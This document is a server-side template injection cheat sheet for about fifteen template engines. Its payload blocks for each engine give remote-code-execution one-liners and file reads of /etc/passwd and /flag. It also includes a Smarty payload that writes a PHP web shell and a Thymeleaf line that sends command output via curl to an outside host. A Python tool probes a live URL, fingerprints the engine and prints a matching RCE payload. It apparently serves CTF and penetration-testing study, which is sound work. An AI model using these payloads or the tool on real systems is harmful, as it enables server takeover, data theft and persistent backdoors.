---
title: "SSTI - Every Other Engine (Twig, Smarty, Freemarker, Velocity, Thymeleaf, ERB, Handlebars, Pug, Mako, Tornado)"
category: web
subcategory: ssti
type: technique
tags: [ssti, template-injection, twig, smarty, freemarker, velocity, thymeleaf, erb, handlebars, pug, nunjucks, ejs, mako, tornado, polyglot, rce, tplmap, sstimap, burp]
difficulty: medium
summary: "Fingerprint the template engine with a math/polyglot ladder, then fire that engine's specific RCE one-liner."
when_to_use:
  - "Input is reflected and some expression syntax evaluates (7*7 -> 49)"
  - "The stack is not Python/Flask, or {{7*'7'}} did not give 7777777"
  - "An error page names Twig_Error, freemarker.core, org.thymeleaf, ActionView::Template::Error"
  - "You control an email/invoice/report template, a theme file, or a CMS snippet"
tools: [tplmap, sstimap, burp, curl]
related: [ssti-jinja2, java-spring-spel-jndi, deser-node-vm-escape, ruby-marshal-yaml-rce]
---

## TL;DR

Every template engine has its own expression syntax and its own escape hatch to the host
language. Identify the engine first (one wrong payload burns a WAF rule), then use its
documented reflection/eval primitive. Fingerprinting is a 4-probe decision tree; RCE is a
one-liner per engine.

## Recognise it

Send the **polyglot** first. It is syntactically invalid in every engine, so the error message
names the engine for you:

```
${{<%[%'"}}%\
```

Then run the math ladder and read which one rendered:

| Probe | Renders 49 in | Notes |
| --- | --- | --- |
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars(no), Liquid(no) | `{{7*'7'}}` -> `7777777` only in Jinja2/Python |
| `${7*7}` | Freemarker, Thymeleaf, JSP EL, Mako, Velocity(no) | Mako also does `${7*7}` |
| `#{7*7}` | Pug, Ruby string interp, Slim | Pug interpolation inside a text node |
| `<%= 7*7 %>` | ERB, EJS, ASP/JSP scriptlet | `<%= 7*7 %>` -> 49 |
| `#set($x=7*7)$x` | Velocity | `$x` alone prints `$x` when undefined |
| `{7*7}` | Smarty | bare braces |
| `*{7*7}` / `${7*7}` / `__${7*7}__::.x` | Thymeleaf | `__...__` is the preprocessing form |
| `{{7*7}}` renders `{{7*7}}` | Django DTL, Go text/template, Handlebars | DTL has no arithmetic in `{{}}` |
| `@(7*7)` | Razor (.NET) | |
| `{{= 7*7}}` | doT | |

Secondary fingerprints:

- `{{constructor.constructor('return 1')()}}` -> `1` means a JS engine (Handlebars/Nunjucks after
  a prototype walk, or Angular client-side).
- `{{_self}}` -> `Twig\Template...` means Twig.
- `{{self}}` -> `<TemplateReference None>` means Jinja2.
- `${.version}` -> a version string means Freemarker.
- `{$smarty.version}` -> Smarty version.
- `{{7|add:7}}` -> `14` means Django DTL.

## Theory

Engines split into three families:

1. **Host-language eval exposed** (ERB, EJS, Mako, Tornado, JSP scriptlets, Smarty `{php}`):
   the template *is* host code. RCE is trivial.
2. **Reflection reachable** (Freemarker, Velocity, Thymeleaf/SpEL, Twig `_self.env`,
   Handlebars/Nunjucks via `constructor.constructor`): the expression language can reach the
   host runtime's class/function factory.
3. **Genuinely sandboxed / data-only** (Django DTL, Go `text/template` with a fixed data set,
   Liquid, Mustache): no RCE; you get information disclosure only (leak `settings`, `.Env`,
   context objects, secret keys), which is often the flag anyway.

## Attack

### Twig (PHP)

```twig
{{7*7}}                                    {# 49 -> Twig or Jinja2 #}
{{7*'7'}}                                  {# 49 in Twig, 7777777 in Jinja2 #}
{{_self}}                                  {# Twig\Template object -> Twig confirmed #}
{{dump(app)}}                              {# Symfony debug: dumps the whole kernel #}
{{app.request.server.all|join(',')}}       {# Symfony env leak #}

{# Twig 1.x: undefined-filter callback #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;cat /flag")}}

{# Twig 2.x/3.x: filter/map/sort/reduce accept a PHP callable #}
{{['id']|filter('system')}}
{{['id',0]|sort('system')|join}}
{{['id']|map('system')|join}}
{{[0,0]|reduce('system','id')}}
{{['cat /flag']|filter('passthru')}}

{# file read without RCE #}
{{'/etc/passwd'|file_excerpt(1,30)}}       {# Symfony extension #}
{{include('/etc/passwd')}}
{{source('/etc/passwd')}}
```

### Smarty (PHP)

```smarty
{$smarty.version}
{php}system('id');{/php}                    {# Smarty < 3.1, or SmartyBC #}
{system('id')}                              {# only if the security policy allows it #}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[0]); ?>",self::clearConfig())}
{$smarty.template_object->smarty->_current_file}   {# path disclosure #}
{literal}...{/literal}
{include file='/etc/passwd'}
{fetch file='/etc/passwd'}
```

### Freemarker (Java)

```freemarker
${7*7}
${.version}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("cat /flag")}
<#assign cl=object?api.class.protectionDomain.classLoader>   <#-- needs ?api enabled -->
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
<#assign jc="freemarker.template.utility.JythonRuntime"?new()><@jc>import os;os.system("id")</@jc>
```

`?new()` is blocked when `TemplateClassResolver.SAFER_RESOLVER` /
`UNRESTRICTED_RESOLVER=false` is configured; `Execute`, `ObjectConstructor` and `JythonRuntime`
are explicitly denied by `SAFER_RESOLVER`. In that case look for an exposed bean in the data
model and reach `.class.classLoader` through it.

### Velocity (Java)

```velocity
#set($x=7*7)$x
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
#set($s=$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id").getInputStream())
#set($br=$e.getClass().forName("java.io.BufferedReader").getConstructor($e.getClass().forName("java.io.Reader")).newInstance($e.getClass().forName("java.io.InputStreamReader").getConstructor($e.getClass().forName("java.io.InputStream")).newInstance($s)))
#set($line=$br.readLine())$line
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")      ## Velocity tools
```

### Thymeleaf (Java / Spring)

```
${7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('curl http://h/$(id|base64)')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}

<!-- expression preprocessing: evaluated BEFORE the main expression, bypasses many filters -->
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

<!-- view-name SSTI: a controller returning a user-controlled view name -->
GET /path/__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x HTTP/1.1
```

Thymeleaf view-name injection fires when a controller returns `return userInput;` without a
`@ResponseBody`, and the fragment expression `::` selector forces evaluation.

### ERB / Ruby

```erb
<%= 7*7 %>
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').readlines() %>
<%= %x(id) %>
<%= File.read('/flag') %>
<%= Dir.entries('/') %>
<%= ENV.to_h %>
<%= eval('1+1') %>
```

Slim: `#{`id`}`. Haml: `#{`id`}` or `= `id``. Plain Ruby string interpolation `#{...}` in any
`"..."` the app builds from user input is the same bug.

### Handlebars (JS)

Handlebars has no arithmetic, so `{{7*7}}` does not render. Escape via prototype walking:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Pug / Jade (JS)

```pug
#{7*7}
#{root.process.mainModule.require('child_process').execSync('id')}
#{global.process.mainModule.require('child_process').execSync('id')}
= process.mainModule.require('child_process').execSync('id')
- var x = global.process.mainModule.require('child_process').execSync('id')
= x
```

### Nunjucks (JS)

```nunjucks
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
{{range.constructor("return global.process.env")()}}
{{joiner.constructor("return 1+1")()}}
```

### EJS (JS)

```ejs
<%= 7*7 %>
<%= process.mainModule.require('child_process').execSync('id') %>
<%- global.process.mainModule.require('child_process').execSync('id') %>
```

EJS also has an options-pollution RCE: if `opts.outputFunctionName`, `opts.escapeFunction`,
`opts.localsName` or `settings['view options']` is attacker-controlled (classically via
prototype pollution), the compiled function body is injected. See `proto-pollution`.

### doT (JS)

```
{{= 7*7 }}
{{= process.mainModule.require('child_process').execSync('id') }}
```

### Mako (Python)

```mako
${7*7}
${self.module.cache.util.os.system("id")}
<%import os%>${os.system('id')}
<% import os; x=os.popen('id').read() %>${x}
${__import__('os').popen('id').read()}
${open('/flag').read()}
```

### Tornado (Python)

```
{{7*7}}
{% import os %}{{os.system('id')}}
{% import subprocess %}{{subprocess.check_output('id',shell=True)}}
{{handler.settings}}          {# leaks cookie_secret #}
{{handler.request.headers}}
```

### Django DTL (Python) -- information disclosure, not RCE

```django
{{7|add:7}}                      {# 14 -> DTL confirmed #}
{{settings.SECRET_KEY}}          {# only with django.template.context_processors.debug, rare #}
{% debug %}                      {# dumps the whole context, incl. settings in DEBUG mode #}
{{request.META}}
{% load module %}                {# CVE-2022-... style tag-loading issues in old versions #}
{% include request.GET.f %}      {# template path traversal when the name is user-controlled #}
```

DTL blocks calls with arguments and any attribute starting with `_`. Treat it as a leak
primitive; look for a *separate* sink (pickle session, `eval`, `SECRET_KEY` reuse).

### Go text/template & html/template

```
{{.}}                            {# dump the whole data object #}
{{printf "%s" .}}
{{.Env}}                         {# if the data has an Env field #}
{{call .Somefunc "id"}}          {# only funcs already in the FuncMap #}
```

No RCE without a dangerous FuncMap entry. `text/template` also has no auto-escaping, so
`{{.UserHTML}}` is an XSS sink.

## Code

```python
#!/usr/bin/env python3
"""Template-engine fingerprinter.

`classify()` is a pure function so it can be unit-tested offline; `probe()` does
the network work with requests when you actually have a target.
"""
from __future__ import annotations

import sys

POLYGLOT = "${{<%[%'\"}}%\\"

# probe name -> template payload
PROBES: dict[str, str] = {
    "polyglot": POLYGLOT,
    "curly": "{{7*7}}",
    "curly_str": "{{7*'7'}}",
    "dollar": "${7*7}",
    "hash": "#{7*7}",
    "erb": "<%= 7*7 %>",
    "velocity": "#set($x=7*7)$x",
    "smarty": "{7*7}",
    "dtl": "{{7|add:7}}",
    "razor": "@(7*7)",
    "dot": "{{= 7*7 }}",
    "handlebars": "{{#with 1}}{{this}}{{/with}}",
    "self": "{{_self}}",
    "jself": "{{self}}",
    "fmver": "${.version}",
}

# engine -> RCE one-liner template (use .replace('CMD', cmd))
RCE: dict[str, str] = {
    "jinja2": "{{lipsum.__globals__.os.popen('CMD').read()}}",
    "twig": "{{['CMD']|filter('system')}}",
    "smarty": "{php}system('CMD');{/php}",
    "freemarker": '${"freemarker.template.utility.Execute"?new()("CMD")}',
    "velocity": '#set($e="e")$e.getClass().forName("java.lang.Runtime")'
                '.getMethod("getRuntime",null).invoke(null,null).exec("CMD")',
    "thymeleaf": "__${T(java.lang.Runtime).getRuntime().exec('CMD')}__::.x",
    "erb": "<%= `CMD` %>",
    "ejs": "<%= process.mainModule.require('child_process').execSync('CMD') %>",
    "nunjucks": "{{range.constructor(\"return global.process.mainModule"
                ".require('child_process').execSync('CMD')\")()}}",
    "pug": "#{root.process.mainModule.require('child_process').execSync('CMD')}",
    "mako": "${self.module.cache.util.os.system('CMD')}",
    "tornado": "{% import os %}{{os.system('CMD')}}",
    "dot": "{{= process.mainModule.require('child_process').execSync('CMD') }}",
    "django": "{% debug %}",
    "go": "{{.}}",
}


def classify(r: dict[str, str]) -> str:
    """Map a dict of {probe_name: rendered_output} to an engine name."""
    err = r.get("polyglot", "").lower()
    for needle, engine in (
        ("twig", "twig"), ("smarty", "smarty"), ("freemarker", "freemarker"),
        ("thymeleaf", "thymeleaf"), ("jinja2", "jinja2"), ("mako", "mako"),
        ("velocity", "velocity"), ("nunjucks", "nunjucks"), ("tornado", "tornado"),
        ("actionview", "erb"), ("ejs", "ejs"), ("pug", "pug"),
    ):
        if needle in err:
            return engine
    if r.get("curly") == "49":
        if r.get("curly_str") == "7777777":
            return "jinja2"
        if "Twig" in r.get("self", ""):
            return "twig"
        if r.get("dollar") == "49":
            return "tornado" if r.get("erb") != "49" else "mako"
        return "nunjucks"
    if r.get("dtl") == "14":
        return "django"
    if r.get("dollar") == "49":
        if r.get("fmver", "").count(".") >= 1:
            return "freemarker"
        if r.get("hash") == "49":
            return "thymeleaf"
        return "mako"
    if r.get("velocity") == "49":
        return "velocity"
    if r.get("erb") == "49":
        return "erb" if r.get("hash") == "49" else "ejs"
    if r.get("hash") == "49":
        return "pug"
    if r.get("smarty") == "49":
        return "smarty"
    if r.get("razor") == "49":
        return "razor"
    if r.get("dot") == "49":
        return "dot"
    if r.get("handlebars") == "1":
        return "handlebars"
    return "unknown"


def probe(url: str, param: str, method: str = "GET") -> dict[str, str]:
    """Send every probe and return {probe: body}. Requires `requests`."""
    import requests
    out: dict[str, str] = {}
    for name, payload in PROBES.items():
        try:
            if method == "GET":
                resp = requests.get(url, params={param: payload}, timeout=10)
            else:
                resp = requests.post(url, data={param: payload}, timeout=10)
            out[name] = resp.text.strip()
        except Exception as exc:          # network problems must not kill the sweep
            out[name] = "ERR:%s" % exc
    return out


def rce_for(engine: str, cmd: str) -> str:
    tpl = RCE.get(engine)
    if tpl is None:
        return "no known one-liner for %r" % engine
    return tpl.replace("CMD", cmd)


def _self_test() -> None:
    cases = [
        ({"curly": "49", "curly_str": "7777777"}, "jinja2"),
        ({"curly": "49", "curly_str": "49", "self": "Twig\\Template"}, "twig"),
        ({"dtl": "14"}, "django"),
        ({"dollar": "49", "fmver": "2.3.31"}, "freemarker"),
        ({"dollar": "49", "hash": "49"}, "thymeleaf"),
        ({"dollar": "49"}, "mako"),
        ({"velocity": "49"}, "velocity"),
        ({"erb": "49", "hash": "49"}, "erb"),
        ({"erb": "49"}, "ejs"),
        ({"hash": "49"}, "pug"),
        ({"smarty": "49"}, "smarty"),
        ({"razor": "49"}, "razor"),
        ({"dot": "49"}, "dot"),
        ({"handlebars": "1"}, "handlebars"),
        ({"polyglot": "Twig_Error_Syntax: unexpected token"}, "twig"),
        ({"polyglot": "freemarker.core.ParseException"}, "freemarker"),
        ({}, "unknown"),
    ]
    for responses, expected in cases:
        got = classify(responses)
        assert got == expected, "%r -> %r, expected %r" % (responses, got, expected)
    assert "system" in rce_for("twig", "id")
    assert "whoami" in rce_for("erb", "whoami")
    assert rce_for("nope", "id").startswith("no known")
    assert len(PROBES) >= 14 and len(RCE) >= 14
    print("[ok] %d classify cases, %d engines with an RCE one-liner"
          % (len(cases), len(RCE)))


if __name__ == "__main__":
    if len(sys.argv) >= 3:
        res = probe(sys.argv[1], sys.argv[2])
        eng = classify(res)
        print("engine:", eng)
        print("rce   :", rce_for(eng, "id"))
    else:
        _self_test()
```

## Variants & pitfalls

- **Client-side template injection** is a different bug: AngularJS `{{constructor.constructor('alert(1)')()}}`,
  Vue `{{_c.constructor('alert(1)')()}}`. Same syntax, XSS impact, no server RCE.
- **Twig `{{7*'7'}}`** giving `49` (PHP coercion) is the single cheapest Jinja2/Twig discriminator.
- **Freemarker in a `?api`-disabled, SAFER_RESOLVER build**: `?new()` on `Execute` throws
  `InstantiationException ... not allowed`. Hunt for an exposed bean instead
  (`${someBean.class.classLoader.resources.context...}`).
- **Thymeleaf** only evaluates `${}` in an attribute processor (`th:text`) or in a fragment
  expression. Raw `${7*7}` inside plain HTML text is printed literally -- that is why the
  `__${...}__::.x` preprocessing form is the reliable one.
- **Smarty 3+ security policy** blocks PHP functions; `{php}` is removed. Look for
  `Smarty_Internal_Write_File` or a custom modifier that wraps `call_user_func`.
- **Engine says 49 but nothing escapes**: you may be in a sandbox (`SandboxedEnvironment`,
  Twig sandbox extension, Liquid). Pivot to information disclosure: dump the context object.
- **WAF-friendly framing**: most engines ignore whitespace and newlines inside the delimiters,
  and many accept `{{- ... -}}` whitespace-control forms.
- **Blind engines**: use a time probe per engine (`sleep 7`) or an out-of-band DNS/HTTP callback;
  Freemarker/Velocity error strings often leak in a 500 body even when output does not.

## Tools

- `SSTImap` (successor to `tplmap`) -- detects and exploits 15+ engines, `--os-shell`, `--upload`.
- `tplmap` -- older but still the reference for the detection heuristics.
- Burp Intruder with the polyglot + the math ladder across every reflected parameter.
- `graphql`-style error mining: force a syntax error and read the stack trace class names.

## References

- PayloadsAllTheThings -- Server Side Template Injection.
- PortSwigger Web Security Academy -- SSTI labs (Twig, Freemarker, Handlebars, Django).
- James Kettle -- "Server-Side Template Injection: RCE for the modern webapp".
- Hacktricks -- SSTI engine matrix.
